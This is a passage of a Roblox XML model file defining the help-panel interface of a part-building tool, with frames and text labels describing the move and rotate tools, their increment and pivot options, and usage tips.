													<Color3 name="TextStrokeColor3">4278190080</Color3>
													<float name="TextStrokeTransparency">1</float>
													<float name="TextTransparency">0</float>
													<bool name="TextWrapped">true</bool>
													<token name="TextXAlignment">0</token>
													<token name="TextYAlignment">0</token>
													<bool name="Visible">true</bool>
													<int name="ZIndex">1</int>
												</Properties>
											</Item>
											<Item class="TextLabel" referent="RBXC32B4534C9994D19906FE370EE5B378E">
												<Properties>
													<bool name="Active">false</bool>
													<Vector2 name="AnchorPoint">
														<X>0</X>
														<Y>0</Y>
													</Vector2>
													<Color3 name="BackgroundColor3">4282203453</Color3>
													<float name="BackgroundTransparency">1</float>
													<Color3 name="BorderColor3">4279970357</Color3>
													<int name="BorderSizePixel">0</int>
													<bool name="ClipsDescendants">false</bool>
													<bool name="Draggable">false</bool>
													<token name="Font">2</token>
													<token name="FontSize">4</token>
													<string name="Name">TextLabel</string>
													<Ref name="NextSelectionDown">null</Ref>
													<Ref name="NextSelectionLeft">null</Ref>
													<Ref name="NextSelectionRight">null</Ref>
													<Ref name="NextSelectionUp">null</Ref>
													<UDim2 name="Position">
														<XS>0</XS>
														<XO>10</XO>
														<YS>0</YS>
														<YO>0</YO>
													</UDim2>
													<float name="Rotation">0</float>
													<bool name="Selectable">false</bool>
													<Ref name="SelectionImageObject">null</Ref>
													<UDim2 name="Size">
														<XS>0</XS>
														<XO>80</XO>
														<YS>0</YS>
														<YO>12</YO>
													</UDim2>
													<token name="SizeConstraint">0</token>
													<string name="Text">Axes</string>
													<Color3 name="TextColor3">4294967295</Color3>
													<bool name="TextScaled">false</bool>
													<float name="TextSize">12</float>
													<Color3 name="TextStrokeColor3">4278190080</Color3>
													<float name="TextStrokeTransparency">1</float>
													<float name="TextTransparency">0</float>
													<bool name="TextWrapped">true</bool>
													<token name="TextXAlignment">0</token>
													<token name="TextYAlignment">0</token>
													<bool name="Visible">true</bool>
													<int name="ZIndex">1</int>
												</Properties>
											</Item>
											<Item class="TextLabel" referent="RBX7928078F7D2C4831BC0FAAA4048F9B54">
												<Properties>
													<bool name="Active">false</bool>
													<Vector2 name="AnchorPoint">
														<X>0</X>
														<Y>0</Y>
													</Vector2>
													<Color3 name="BackgroundColor3">4294967295</Color3>
													<float name="BackgroundTransparency">1</float>
													<Color3 name="BorderColor3">4279970357</Color3>
													<int name="BorderSizePixel">0</int>
													<bool name="ClipsDescendants">false</bool>
													<bool name="Draggable">false</bool>
													<token name="Font">1</token>
													<token name="FontSize">4</token>
													<string name="Name">TextLabel</string>
													<Ref name="NextSelectionDown">null</Ref>
													<Ref name="NextSelectionLeft">null</Ref>
													<Ref name="NextSelectionRight">null</Ref>
													<Ref name="NextSelectionUp">null</Ref>
													<UDim2 name="Position">
														<XS>0</XS>
														<XO>10</XO>
														<YS>0</YS>
														<YO>210</YO>
													</UDim2>
													<float name="Rotation">0</float>
													<bool name="Selectable">false</bool>
													<Ref name="SelectionImageObject">null</Ref>
													<UDim2 name="Size">
														<XS>0</XS>
														<XO>80</XO>
														<YS>0</YS>
														<YO>90</YO>
													</UDim2>
													<token name="SizeConstraint">0</token>
													<string name="Text">TIP: When your axes are set to local or last, you can right click to change which part has the handles.</string>
													<Color3 name="TextColor3">4294967295</Color3>
													<bool name="TextScaled">false</bool>
													<float name="TextSize">12</float>
													<Color3 name="TextStrokeColor3">4278190080</Color3>
													<float name="TextStrokeTransparency">1</float>
													<float name="TextTransparency">0</float>
													<bool name="TextWrapped">true</bool>
													<token name="TextXAlignment">0</token>
													<token name="TextYAlignment">0</token>
													<bool name="Visible">true</bool>
													<int name="ZIndex">1</int>
												</Properties>
											</Item>
										</Item>
										<Item class="Frame" referent="RBXB0CFD94E39364A7EAD4F0F868A5E2E56">
											<Properties>
												<bool name="Active">false</bool>
												<Vector2 name="AnchorPoint">
													<X>0</X>
													<Y>0</Y>
												</Vector2>
												<Color3 name="BackgroundColor3">4294945280</Color3>
												<float name="BackgroundTransparency">0</float>
												<Color3 name="BorderColor3">4279970357</Color3>
												<int name="BorderSizePixel">0</int>
												<bool name="ClipsDescendants">false</bool>
												<bool name="Draggable">false</bool>
												<string name="Name">ColorBar</string>
												<Ref name="NextSelectionDown">null</Ref>
												<Ref name="NextSelectionLeft">null</Ref>
												<Ref name="NextSelectionRight">null</Ref>
												<Ref name="NextSelectionUp">null</Ref>
												<UDim2 name="Position">
													<XS>0</XS>
													<XO>0</XO>
													<YS>0</YS>
													<YO>0</YO>
												</UDim2>
												<float name="Rotation">0</float>
												<bool name="Selectable">false</bool>
												<Ref name="SelectionImageObject">null</Ref>
												<UDim2 name="Size">
													<XS>1</XS>
													<XO>0</XO>
													<YS>0</YS>
													<YO>2</YO>
												</UDim2>
												<token name="SizeConstraint">0</token>
												<token name="Style">0</token>
												<bool name="Visible">true</bool>
												<int name="ZIndex">1</int>
											</Properties>
										</Item>
										<Item class="TextLabel" referent="RBX1820B70C46F34248B67D08001F9066FC">
											<Properties>
												<bool name="Active">false</bool>
												<Vector2 name="AnchorPoint">
													<X>0</X>
													<Y>0</Y>
												</Vector2>
												<Color3 name="BackgroundColor3">4294967295</Color3>
												<float name="BackgroundTransparency">1</float>
												<Color3 name="BorderColor3">4279970357</Color3>
												<int name="BorderSizePixel">0</int>
												<bool name="ClipsDescendants">false</bool>
												<bool name="Draggable">false</bool>
												<token name="Font">1</token>
												<token name="FontSize">4</token>
												<string name="Name">ToolDescription</string>
												<Ref name="NextSelectionDown">null</Ref>
												<Ref name="NextSelectionLeft">null</Ref>
												<Ref name="NextSelectionRight">null</Ref>
												<Ref name="NextSelectionUp">null</Ref>
												<UDim2 name="Position">
													<XS>0</XS>
													<XO>10</XO>
													<YS>0</YS>
													<YO>25</YO>
												</UDim2>
												<float name="Rotation">0</float>
												<bool name="Selectable">false</bool>
												<Ref name="SelectionImageObject">null</Ref>
												<UDim2 name="Size">
													<XS>0</XS>
													<XO>80</XO>
													<YS>0</YS>
													<YO>50</YO>
												</UDim2>
												<token name="SizeConstraint">0</token>
												<string name="Text">Allows you to move parts.</string>
												<Color3 name="TextColor3">4294967295</Color3>
												<bool name="TextScaled">false</bool>
												<float name="TextSize">12</float>
												<Color3 name="TextStrokeColor3">4278190080</Color3>
												<float name="TextStrokeTransparency">1</float>
												<float name="TextTransparency">0</float>
												<bool name="TextWrapped">true</bool>
												<token name="TextXAlignment">0</token>
												<token name="TextYAlignment">0</token>
												<bool name="Visible">true</bool>
												<int name="ZIndex">1</int>
											</Properties>
										</Item>
										<Item class="TextLabel" referent="RBXA7573C83B335400B8DE502945A783656">
											<Properties>
												<bool name="Active">false</bool>
												<Vector2 name="AnchorPoint">
													<X>0</X>
													<Y>0</Y>
												</Vector2>
												<Color3 name="BackgroundColor3">4294967295</Color3>
												<float name="BackgroundTransparency">1</float>
												<Color3 name="BorderColor3">4279970357</Color3>
												<int name="BorderSizePixel">0</int>
												<bool name="ClipsDescendants">false</bool>
												<bool name="Draggable">false</bool>
												<token name="Font">2</token>
												<token name="FontSize">4</token>
												<string name="Name">ToolName</string>
												<Ref name="NextSelectionDown">null</Ref>
												<Ref name="NextSelectionLeft">null</Ref>
												<Ref name="NextSelectionRight">null</Ref>
												<Ref name="NextSelectionUp">null</Ref>
												<UDim2 name="Position">
													<XS>0</XS>
													<XO>10</XO>
													<YS>0</YS>
													<YO>0</YO>
												</UDim2>
												<float name="Rotation">0</float>
												<bool name="Selectable">false</bool>
												<Ref name="SelectionImageObject">null</Ref>
												<UDim2 name="Size">
													<XS>0</XS>
													<XO>50</XO>
													<YS>0</YS>
													<YO>25</YO>
												</UDim2>
												<token name="SizeConstraint">0</token>
												<string name="Text">MOVE TOOL</string>
												<Color3 name="TextColor3">4294967295</Color3>
												<bool name="TextScaled">false</bool>
												<float name="TextSize">12</float>
												<Color3 name="TextStrokeColor3">4278190080</Color3>
												<float name="TextStrokeTransparency">1</float>
												<float name="TextTransparency">0</float>
												<bool name="TextWrapped">false</bool>
												<token name="TextXAlignment">0</token>
												<token name="TextYAlignment">1</token>
												<bool name="Visible">true</bool>
												<int name="ZIndex">1</int>
											</Properties>
										</Item>
										<Item class="Frame" referent="RBX16269DAA6777439A802FA0834277AFA3">
											<Properties>
												<bool name="Active">false</bool>
												<Vector2 name="AnchorPoint">
													<X>0</X>
													<Y>0</Y>
												</Vector2>
												<Color3 name="BackgroundColor3">4294967295</Color3>
												<float name="BackgroundTransparency">1</float>
												<Color3 name="BorderColor3">4279970357</Color3>
												<int name="BorderSizePixel">0</int>
												<bool name="ClipsDescendants">false</bool>
												<bool name="Draggable">false</bool>
												<string name="Name">IncrementInfo</string>
												<Ref name="NextSelectionDown">null</Ref>
												<Ref name="NextSelectionLeft">null</Ref>
												<Ref name="NextSelectionRight">null</Ref>
												<Ref name="NextSelectionUp">null</Ref>
												<UDim2 name="Position">
													<XS>0</XS>
													<XO>0</XO>
													<YS>0</YS>
													<YO>365</YO>
												</UDim2>
												<float name="Rotation">0</float>
												<bool name="Selectable">false</bool>
												<Ref name="SelectionImageObject">null</Ref>
												<UDim2 name="Size">
													<XS>1</XS>
													<XO>0</XO>
													<YS>0</YS>
													<YO>300</YO>
												</UDim2>
												<token name="SizeConstraint">0</token>
												<token name="Style">0</token>
												<bool name="Visible">true</bool>
												<int name="ZIndex">1</int>
											</Properties>
											<Item class="TextLabel" referent="RBX166612753E174FDAB324362F6DB2A55B">
												<Properties>
													<bool name="Active">false</bool>
													<Vector2 name="AnchorPoint">
														<X>0</X>
														<Y>0</Y>
													</Vector2>
													<Color3 name="BackgroundColor3">4294967295</Color3>
													<float name="BackgroundTransparency">1</float>
													<Color3 name="BorderColor3">4279970357</Color3>
													<int name="BorderSizePixel">0</int>
													<bool name="ClipsDescendants">false</bool>
													<bool name="Draggable">false</bool>
													<token name="Font">1</token>
													<token name="FontSize">4</token>
													<string name="Name">TextLabel</string>
													<Ref name="NextSelectionDown">null</Ref>
													<Ref name="NextSelectionLeft">null</Ref>
													<Ref name="NextSelectionRight">null</Ref>
													<Ref name="NextSelectionUp">null</Ref>
													<UDim2 name="Position">
														<XS>0</XS>
														<XO>10</XO>
														<YS>0</YS>
														<YO>15</YO>
													</UDim2>
													<float name="Rotation">0</float>
													<bool name="Selectable">false</bool>
													<Ref name="SelectionImageObject">null</Ref>
													<UDim2 name="Size">
														<XS>0</XS>
														<XO>80</XO>
														<YS>0</YS>
														<YO>60</YO>
													</UDim2>
													<token name="SizeConstraint">0</token>
													<string name="Text">Lets you choose how many studs to move the parts.</string>
													<Color3 name="TextColor3">4294967295</Color3>
													<bool name="TextScaled">false</bool>
													<float name="TextSize">12</float>
													<Color3 name="TextStrokeColor3">4278190080</Color3>
													<float name="TextStrokeTransparency">1</float>
													<float name="TextTransparency">0</float>
													<bool name="TextWrapped">true</bool>
													<token name="TextXAlignment">0</token>
													<token name="TextYAlignment">0</token>
													<bool name="Visible">true</bool>
													<int name="ZIndex">1</int>
												</Properties>
											</Item>
											<Item class="TextLabel" referent="RBXD8F133A72A2B4B2387D67B470FCF90FB">
												<Properties>
													<bool name="Active">false</bool>
													<Vector2 name="AnchorPoint">
														<X>0</X>
														<Y>0</Y>
													</Vector2>
													<Color3 name="BackgroundColor3">4282203453</Color3>
													<float name="BackgroundTransparency">1</float>
													<Color3 name="BorderColor3">4279970357</Color3>
													<int name="BorderSizePixel">0</int>
													<bool name="ClipsDescendants">false</bool>
													<bool name="Draggable">false</bool>
													<token name="Font">2</token>
													<token name="FontSize">4</token>
													<string name="Name">TextLabel</string>
													<Ref name="NextSelectionDown">null</Ref>
													<Ref name="NextSelectionLeft">null</Ref>
													<Ref name="NextSelectionRight">null</Ref>
													<Ref name="NextSelectionUp">null</Ref>
													<UDim2 name="Position">
														<XS>0</XS>
														<XO>10</XO>
														<YS>0</YS>
														<YO>0</YO>
													</UDim2>
													<float name="Rotation">0</float>
													<bool name="Selectable">false</bool>
													<Ref name="SelectionImageObject">null</Ref>
													<UDim2 name="Size">
														<XS>0</XS>
														<XO>80</XO>
														<YS>0</YS>
														<YO>12</YO>
													</UDim2>
													<token name="SizeConstraint">0</token>
													<string name="Text">Increment</string>
													<Color3 name="TextColor3">4294967295</Color3>
													<bool name="TextScaled">false</bool>
													<float name="TextSize">12</float>
													<Color3 name="TextStrokeColor3">4278190080</Color3>
													<float name="TextStrokeTransparency">1</float>
													<float name="TextTransparency">0</float>
													<bool name="TextWrapped">true</bool>
													<token name="TextXAlignment">0</token>
													<token name="TextYAlignment">0</token>
													<bool name="Visible">true</bool>
													<int name="ZIndex">1</int>
												</Properties>
											</Item>
											<Item class="TextLabel" referent="RBX7A98E5B03959495C8DEB224BC09B80CE">
												<Properties>
													<bool name="Active">false</bool>
													<Vector2 name="AnchorPoint">
														<X>0</X>
														<Y>0</Y>
													</Vector2>
													<Color3 name="BackgroundColor3">4282203453</Color3>
													<float name="BackgroundTransparency">1</float>
													<Color3 name="BorderColor3">4279970357</Color3>
													<int name="BorderSizePixel">0</int>
													<bool name="ClipsDescendants">false</bool>
													<bool name="Draggable">false</bool>
													<token name="Font">1</token>
													<token name="FontSize">4</token>
													<string name="Name">TextLabel</string>
													<Ref name="NextSelectionDown">null</Ref>
													<Ref name="NextSelectionLeft">null</Ref>
													<Ref name="NextSelectionRight">null</Ref>
													<Ref name="NextSelectionUp">null</Ref>
													<UDim2 name="Position">
														<XS>0</XS>
														<XO>10</XO>
														<YS>0</YS>
														<YO>70</YO>
													</UDim2>
													<float name="Rotation">0</float>
													<bool name="Selectable">false</bool>
													<Ref name="SelectionImageObject">null</Ref>
													<UDim2 name="Size">
														<XS>0</XS>
														<XO>80</XO>
														<YS>0</YS>
														<YO>50</YO>
													</UDim2>
													<token name="SizeConstraint">0</token>
													<string name="Text">TIP: Use the - key to focus on the increment input.</string>
													<Color3 name="TextColor3">4294967295</Color3>
													<bool name="TextScaled">false</bool>
													<float name="TextSize">12</float>
													<Color3 name="TextStrokeColor3">4278190080</Color3>
													<float name="TextStrokeTransparency">1</float>
													<float name="TextTransparency">0</float>
													<bool name="TextWrapped">true</bool>
													<token name="TextXAlignment">0</token>
													<token name="TextYAlignment">0</token>
													<bool name="Visible">true</bool>
													<int name="ZIndex">1</int>
												</Properties>
											</Item>
										</Item>
									</Item>
								</Item>
								<Item class="Frame" referent="RBX6B616CF96F064B3399A73ADD81ABB71A">
									<Properties>
										<bool name="Active">false</bool>
										<Vector2 name="AnchorPoint">
											<X>0</X>
											<Y>0</Y>
										</Vector2>
										<Color3 name="BackgroundColor3">4282203453</Color3>
										<float name="BackgroundTransparency">0.200000003</float>
										<Color3 name="BorderColor3">4279970357</Color3>
										<int name="BorderSizePixel">0</int>
										<bool name="ClipsDescendants">false</bool>
										<bool name="Draggable">false</bool>
										<string name="Name">RotateInfo</string>
										<Ref name="NextSelectionDown">null</Ref>
										<Ref name="NextSelectionLeft">null</Ref>
										<Ref name="NextSelectionRight">null</Ref>
										<Ref name="NextSelectionUp">null</Ref>
										<UDim2 name="Position">
											<XS>0</XS>
											<XO>0</XO>
											<YS>0</YS>
											<YO>0</YO>
										</UDim2>
										<float name="Rotation">0</float>
										<bool name="Selectable">false</bool>
										<Ref name="SelectionImageObject">null</Ref>
										<UDim2 name="Size">
											<XS>1</XS>
											<XO>0</XO>
											<YS>1</YS>
											<YO>0</YO>
										</UDim2>
										<token name="SizeConstraint">0</token>
										<token name="Style">0</token>
										<bool name="Visible">false</bool>
										<int name="ZIndex">1</int>
									</Properties>
									<Item class="Frame" referent="RBX157691FF1B6E4B31AF03C362E6C85589">
										<Properties>
											<bool name="Active">false</bool>
											<Vector2 name="AnchorPoint">
												<X>0</X>
												<Y>0</Y>
											</Vector2>
											<Color3 name="BackgroundColor3">4294967295</Color3>
											<float name="BackgroundTransparency">1</float>
											<Color3 name="BorderColor3">4279970357</Color3>
											<int name="BorderSizePixel">0</int>
											<bool name="ClipsDescendants">false</bool>
											<bool name="Draggable">false</bool>
											<string name="Name">Content</string>
											<Ref name="NextSelectionDown">null</Ref>
											<Ref name="NextSelectionLeft">null</Ref>
											<Ref name="NextSelectionRight">null</Ref>
											<Ref name="NextSelectionUp">null</Ref>
											<UDim2 name="Position">
												<XS>0</XS>
												<XO>0</XO>
												<YS>0</YS>
												<YO>0</YO>
											</UDim2>
											<float name="Rotation">0</float>
											<bool name="Selectable">false</bool>
											<Ref name="SelectionImageObject">null</Ref>
											<UDim2 name="Size">
												<XS>1</XS>
												<XO>0</XO>
												<YS>0</YS>
												<YO>530</YO>
											</UDim2>
											<token name="SizeConstraint">0</token>
											<token name="Style">0</token>
											<bool name="Visible">true</bool>
											<int name="ZIndex">1</int>
										</Properties>
										<Item class="Frame" referent="RBX2804E1EE6CCF476E9450D9D84F88DB8D">
											<Properties>
												<bool name="Active">false</bool>
												<Vector2 name="AnchorPoint">
													<X>0</X>
													<Y>0</Y>
												</Vector2>
												<Color3 name="BackgroundColor3">4294967295</Color3>
												<float name="BackgroundTransparency">1</float>
												<Color3 name="BorderColor3">4279970357</Color3>
												<int name="BorderSizePixel">0</int>
												<bool name="ClipsDescendants">false</bool>
												<bool name="Draggable">false</bool>
												<string name="Name">PivotInfo</string>
												<Ref name="NextSelectionDown">null</Ref>
												<Ref name="NextSelectionLeft">null</Ref>
												<Ref name="NextSelectionRight">null</Ref>
												<Ref name="NextSelectionUp">null</Ref>
												<UDim2 name="Position">
													<XS>0</XS>
													<XO>0</XO>
													<YS>0</YS>
													<YO>60</YO>
												</UDim2>
												<float name="Rotation">0</float>
												<bool name="Selectable">false</bool>
												<Ref name="SelectionImageObject">null</Ref>
												<UDim2 name="Size">
													<XS>1</XS>
													<XO>0</XO>
													<YS>0</YS>
													<YO>300</YO>
												</UDim2>
												<token name="SizeConstraint">0</token>
												<token name="Style">0</token>
												<bool name="Visible">true</bool>
												<int name="ZIndex">1</int>
											</Properties>
											<Item class="Frame" referent="RBX2817BB9B684146A6B37603F938DD645A">
												<Properties>
													<bool name="Active">false</bool>
													<Vector2 name="AnchorPoint">
														<X>0</X>
														<Y>0</Y>
													</Vector2>
													<Color3 name="BackgroundColor3">4283144011</Color3>
													<float name="BackgroundTransparency">0</float>
													<Color3 name="BorderColor3">4279970357</Color3>
													<int name="BorderSizePixel">0</int>
													<bool name="ClipsDescendants">false</bool>
													<bool name="Draggable">false</bool>
													<string name="Name">Frame</string>
													<Ref name="NextSelectionDown">null</Ref>
													<Ref name="NextSelectionLeft">null</Ref>
													<Ref name="NextSelectionRight">null</Ref>
													<Ref name="NextSelectionUp">null</Ref>
													<UDim2 name="Position">
														<XS>0</XS>
														<XO>10</XO>
														<YS>0</YS>
														<YO>73</YO>
													</UDim2>
													<float name="Rotation">0</float>
													<bool name="Selectable">false</bool>
													<Ref name="SelectionImageObject">null</Ref>
													<UDim2 name="Size">
														<XS>0</XS>
														<XO>2</XO>
														<YS>0</YS>
														<YO>168</YO>
													</UDim2>
													<token name="SizeConstraint">0</token>
													<token name="Style">0</token>
													<bool name="Visible">true</bool>
													<int name="ZIndex">1</int>
												</Properties>
											</Item>
											<Item class="TextLabel" referent="RBX66DA9430D3F44ABAAF0DDA0A7A5F499B">
												<Properties>
													<bool name="Active">false</bool>
													<Vector2 name="AnchorPoint">
														<X>0</X>
														<Y>0</Y>
													</Vector2>
													<Color3 name="BackgroundColor3">4294967295</Color3>
													<float name="BackgroundTransparency">1</float>
													<Color3 name="BorderColor3">4279970357</Color3>
													<int name="BorderSizePixel">0</int>
													<bool name="ClipsDescendants">false</bool>
													<bool name="Draggable">false</bool>
													<token name="Font">1</token>
													<token name="FontSize">4</token>
													<string name="Name">TextLabel</string>
													<Ref name="NextSelectionDown">null</Ref>
													<Ref name="NextSelectionLeft">null</Ref>
													<Ref name="NextSelectionRight">null</Ref>
													<Ref name="NextSelectionUp">null</Ref>
													<UDim2 name="Position">
														<XS>0</XS>
														<XO>17</XO>
														<YS>0</YS>
														<YO>71</YO>
													</UDim2>
													<float name="Rotation">0</float>
													<bool name="Selectable">false</bool>
													<Ref name="SelectionImageObject">null</Ref>
													<UDim2 name="Size">
														<XS>0</XS>
														<XO>80</XO>
														<YS>0</YS>
														<YO>180</YO>
													</UDim2>
													<token name="SizeConstraint">0</token>
													<string name="Text"><![CDATA[CENTER - Rotate around the center of the group of selected parts

LOCAL - Rotate each part around its own center

LAST - Rotate each part around the center of the last part selected]]></string>
													<Color3 name="TextColor3">4294967295</Color3>
													<bool name="TextScaled">false</bool>
													<float name="TextSize">12</float>
													<Color3 name="TextStrokeColor3">4278190080</Color3>
													<float name="TextStrokeTransparency">1</float>
													<float name="TextTransparency">0</float>
													<bool name="TextWrapped">true</bool>
													<token name="TextXAlignment">0</token>
													<token name="TextYAlignment">0</token>
													<bool name="Visible">true</bool>
													<int name="ZIndex">1</int>
												</Properties>
											</Item>
											<Item class="TextLabel" referent="RBX55084E9D46124AAEB06E966BE0917A34">
												<Properties>
													<bool name="Active">false</bool>
													<Vector2 name="AnchorPoint">
														<X>0</X>
														<Y>0</Y>
													</Vector2>
													<Color3 name="BackgroundColor3">4294967295</Color3>
													<float name="BackgroundTransparency">1</float>
													<Color3 name="BorderColor3">4279970357</Color3>
													<int name="BorderSizePixel">0</int>
													<bool name="ClipsDescendants">false</bool>
													<bool name="Draggable">false</bool>
													<token name="Font">1</token>
													<token name="FontSize">4</token>
													<string name="Name">TextLabel</string>
													<Ref name="NextSelectionDown">null</Ref>
													<Ref name="NextSelectionLeft">null</Ref>
													<Ref name="NextSelectionRight">null</Ref>
													<Ref name="NextSelectionUp">null</Ref>
													<UDim2 name="Position">
														<XS>0</XS>
														<XO>10</XO>
														<YS>0</YS>
														<YO>15</YO>
													</UDim2>
													<float name="Rotation">0</float>
													<bool name="Selectable">false</bool>
													<Ref name="SelectionImageObject">null</Ref>
													<UDim2 name="Size">
														<XS>0</XS>
														<XO>80</XO>
														<YS>0</YS>
														<YO>60</YO>
													</UDim2>
													<token name="SizeConstraint">0</token>
													<string name="Text">This option lets you choose what to rotate the parts around.</string>
													<Color3 name="TextColor3">4294967295</Color3>
													<bool name="TextScaled">false</bool>
													<float name="TextSize">12</float>
													<Color3 name="TextStrokeColor3">4278190080</Color3>
													<float name="TextStrokeTransparency">1</float>
													<float name="TextTransparency">0</float>
													<bool name="TextWrapped">true</bool>
													<token name="TextXAlignment">0</token>
													<token name="TextYAlignment">0</token>
													<bool name="Visible">true</bool>
													<int name="ZIndex">1</int>
												</Properties>
											</Item>
											<Item class="TextLabel" referent="RBX0EBB73A514F74B0DAA8285B5686E0B38">
												<Properties>
													<bool name="Active">false</bool>
													<Vector2 name="AnchorPoint">
														<X>0</X>
														<Y>0</Y>
													</Vector2>
													<Color3 name="BackgroundColor3">4282203453</Color3>
													<float name="BackgroundTransparency">1</float>
													<Color3 name="BorderColor3">4279970357</Color3>
													<int name="BorderSizePixel">0</int>
													<bool name="ClipsDescendants">false</bool>
													<bool name="Draggable">false</bool>
													<token name="Font">2</token>
													<token name="FontSize">4</token>
													<string name="Name">TextLabel</string>
													<Ref name="NextSelectionDown">null</Ref>
													<Ref name="NextSelectionLeft">null</Ref>
													<Ref name="NextSelectionRight">null</Ref>
													<Ref name="NextSelectionUp">null</Ref>
													<UDim2 name="Position">
														<XS>0</XS>
														<XO>10</XO>
														<YS>0</YS>
														<YO>0</YO>
													</UDim2>
													<float name="Rotation">0</float>
													<bool name="Selectable">false</bool>
													<Ref name="SelectionImageObject">null</Ref>
													<UDim2 name="Size">
														<XS>0</XS>
														<XO>80</XO>
														<YS>0</YS>
														<YO>12</YO>
													</UDim2>
													<token name="SizeConstraint">0</token>
													<string name="Text">Pivot</string>
													<Color3 name="TextColor3">4294967295</Color3>
													<bool name="TextScaled">false</bool>
													<float name="TextSize">12</float>
													<Color3 name="TextStrokeColor3">4278190080</Color3>
													<float name="TextStrokeTransparency">1</float>
													<float name="TextTransparency">0</float>
													<bool name="TextWrapped">true</bool>
													<token name="TextXAlignment">0</token>
													<token name="TextYAlignment">0</token>
													<bool name="Visible">true</bool>
													<int name="ZIndex">1</int>
												</Properties>
											</Item>
											<Item class="TextLabel" referent="RBX94D54A1B9371403EA0651531C05D6E82">
												<Properties>
													<bool name="Active">false</bool>
													<Vector2 name="AnchorPoint">
														<X>0</X>
														<Y>0</Y>
													</Vector2>
													<Color3 name="BackgroundColor3">4294967295</Color3>
													<float name="BackgroundTransparency">1</float>
													<Color3 name="BorderColor3">4279970357</Color3>
													<int name="BorderSizePixel">0</int>
													<bool name="ClipsDescendants">false</bool>
													<bool name="Draggable">false</bool>
													<token name="Font">1</token>
													<token name="FontSize">4</token>
													<string name="Name">TextLabel</string>
													<Ref name="NextSelectionDown">null</Ref>
													<Ref name="NextSelectionLeft">null</Ref>
													<Ref name="NextSelectionRight">null</Ref>
													<Ref name="NextSelectionUp">null</Ref>
													<UDim2 name="Position">
														<XS>0</XS>
														<XO>10</XO>
														<YS>0</YS>
														<YO>250</YO>
													</UDim2>
													<float name="Rotation">0</float>
													<bool name="Selectable">false</bool>
													<Ref name="SelectionImageObject">null</Ref>
													<UDim2 name="Size">
														<XS>0</XS>
														<XO>80</XO>
														<YS>0</YS>
														<YO>90</YO>
													</UDim2>
													<token name="SizeConstraint">0</token>
													<string name="Text">TIP: When the pivot is set to local or last, you can right click to switch which part has the handles.</string>
													<Color3 name="TextColor3">4294967295</Color3>
													<bool name="TextScaled">false</bool>
													<float name="TextSize">12</float>
													<Color3 name="TextStrokeColor3">4278190080</Color3>
													<float name="TextStrokeTransparency">1</float>
													<float name="TextTransparency">0</float>
													<bool name="TextWrapped">true</bool>
													<token name="TextXAlignment">0</token>
													<token name="TextYAlignment">0</token>
													<bool name="Visible">true</bool>
													<int name="ZIndex">1</int>
												</Properties>
											</Item>
										</Item>
										<Item class="Frame" referent="RBXC82CF70B361D4457A3B27876DCC19515">
											<Properties>
												<bool name="Active">false</bool>
												<Vector2 name="AnchorPoint">
													<X>0</X>
													<Y>0</Y>
												</Vector2>
												<Color3 name="BackgroundColor3">4283144011</Color3>
												<float name="BackgroundTransparency">0</float>
												<Color3 name="BorderColor3">4279970357</Color3>
												<int name="BorderSizePixel">0</int>
												<bool name="ClipsDescendants">false</bool>
												<bool name="Draggable">false</bool>
												<string name="Name">ColorBar</string>
												<Ref name="NextSelectionDown">null</Ref>
												<Ref name="NextSelectionLeft">null</Ref>
												<Ref name="NextSelectionRight">null</Ref>
												<Ref name="NextSelectionUp">null</Ref>
												<UDim2 name="Position">
													<XS>0</XS>
													<XO>0</XO>
													<YS>0</YS>
													<YO>0</YO>
												</UDim2>
												<float name="Rotation">0</float>
												<bool name="Selectable">false</bool>
												<Ref name="SelectionImageObject">null</Ref>
												<UDim2 name="Size">
													<XS>1</XS>
													<XO>0</XO>
													<YS>0</YS>
													<YO>2</YO>
												</UDim2>
												<token name="SizeConstraint">0</token>
												<token name="Style">0</token>
												<bool name="Visible">true</bool>
												<int name="ZIndex">1</int>
											</Properties>
										</Item>
										<Item class="TextLabel" referent="RBX729FB93227474F3EA3F28ADEBC28AF4C">
											<Properties>
												<bool name="Active">false</bool>
												<Vector2 name="AnchorPoint">
													<X>0</X>
													<Y>0</Y>
												</Vector2>
												<Color3 name="BackgroundColor3">4294967295</Color3>
												<float name="BackgroundTransparency">1</float>
												<Color3 name="BorderColor3">4279970357</Color3>
												<int name="BorderSizePixel">0</int>
												<bool name="ClipsDescendants">false</bool>
												<bool name="Draggable">false</bool>
												<token name="Font">1</token>
												<token name="FontSize">4</token>
												<string name="Name">ToolDescription</string>
												<Ref name="NextSelectionDown">null</Ref>
												<Ref name="NextSelectionLeft">null</Ref>
												<Ref name="NextSelectionRight">null</Ref>
												<Ref name="NextSelectionUp">null</Ref>
												<UDim2 name="Position">
													<XS>0</XS>
													<XO>10</XO>
													<YS>0</YS>
													<YO>25</YO>
												</UDim2>
												<float name="Rotation">0</float>
												<bool name="Selectable">false</bool>
												<Ref name="SelectionImageObject">null</Ref>
												<UDim2 name="Size">
													<XS>0</XS>
													<XO>80</XO>
													<YS>0</YS>
													<YO>50</YO>
												</UDim2>
												<token name="SizeConstraint">0</token>
												<string name="Text">Allows you to rotate parts.</string>
												<Color3 name="TextColor3">4294967295</Color3>
												<bool name="TextScaled">false</bool>
												<float name="TextSize">12</float>
												<Color3 name="TextStrokeColor3">4278190080</Color3>
												<float name="TextStrokeTransparency">1</float>
												<float name="TextTransparency">0</float>
												<bool name="TextWrapped">true</bool>
												<token name="TextXAlignment">0</token>
												<token name="TextYAlignment">0</token>
												<bool name="Visible">true</bool>
												<int name="ZIndex">1</int>
											</Properties>
										</Item>
										<Item class="TextLabel" referent="RBXBFCC50EB9DB74119A0990F605E155492">
											<Properties>
												<bool name="Active">false</bool>
												<Vector2 name="AnchorPoint">
													<X>0</X>
													<Y>0</Y>
												</Vector2>
												<Color3 name="BackgroundColor3">4294967295</Color3>
												<float name="BackgroundTransparency">1</float>
												<Color3 name="BorderColor3">4279970357</Color3>
												<int name="BorderSizePixel">0</int>
												<bool name="ClipsDescendants">false</bool>
												<bool name="Draggable">false</bool>
												<token name="Font">2</token>
												<token name="FontSize">4</token>
												<string name="Name">ToolName</string>
												<Ref name="NextSelectionDown">null</Ref>
												<Ref name="NextSelectionLeft">null</Ref>
												<Ref name="NextSelectionRight">null</Ref>
												<Ref name="NextSelectionUp">null</Ref>
												<UDim2 name="Position">
													<XS>0</XS>
													<XO>10</XO>
													<YS>0</YS>
													<YO>0</YO>
												</UDim2>
												<float name="Rotation">0</float>
												<bool name="Selectable">false</bool>
												<Ref name="SelectionImageObject">null</Ref>
												<UDim2 name="Size">
													<XS>0</XS>
													<XO>50</XO>
													<YS>0</YS>
													<YO>25</YO>
												</UDim2>
												<token name="SizeConstraint">0</token>
